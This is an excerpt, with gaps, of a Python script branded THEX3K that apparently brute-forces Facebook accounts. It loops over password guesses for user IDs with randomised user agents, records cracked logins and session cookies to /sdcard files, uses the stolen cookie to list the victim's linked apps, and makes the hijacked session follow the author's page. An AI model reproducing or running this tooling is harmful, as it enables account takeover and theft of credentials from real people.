...
def ud():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://www.facebook.com/THEX3K')
...
\033[1;32m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘""")
    ...
    if opt == '3':
        ...
        os.system('xdg-open https://www.facebook.com/THEX3Kk189')
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[THEX3K] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[THEX3K] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/THEX3Kk189', {
...
logo =                                          ("""   
  ...
  _____    _   _  U _____ u __  __   _____    _  __    

 |_ " _|  |'| |'| \| ___"|/ \ \/"/  |___"/u  |"|/ /    

   | |   /| |_| |\ |  _|"   /\  /\  U_|_ \/  | ' /     

  /| |\  U|  _  |u | |___  U /  \ u  ___) |U/| . \\u   

 u |_|U   |_| |_|  |_____|  /_/\_\  |____/   |_|\_\    

 _// \\_  //   \\  <<   >>,-,>> \\_  _// \\,-,>> \\,-. 

(__) (__)(_") ("_)(__) (__)\_)  (__)(__)(__)\.)   (_/  

\033[1;32m┌━━━━━━━━━━━━━━━━━ \033[1;97mTHEX3K\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┑

\033[1;32m┃   \033[1;32mCREATED BY\33[0;m   :  \033[1;32mTHEX3K.CYBER            ┃

┃   \033[1;32mFACEBOK      : \033[1;32m THEX3K             ┃

┃   \033[1;32mGITHUB       :  \033[1;32mTHEX3K       ┃
...
└━━━━━━━━━━━━━━━━━ \033[1;97mTHEX3K\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┘
...
for xd in range(10000):
	...
	a='Mozilla/5.0; Profile/MIDP-2.1'	b=random.randrange(1, 9)
...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(THEX3K-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/THEX3K-OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(THEX3K-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/THEX3K-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r     %s[THEX3K] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
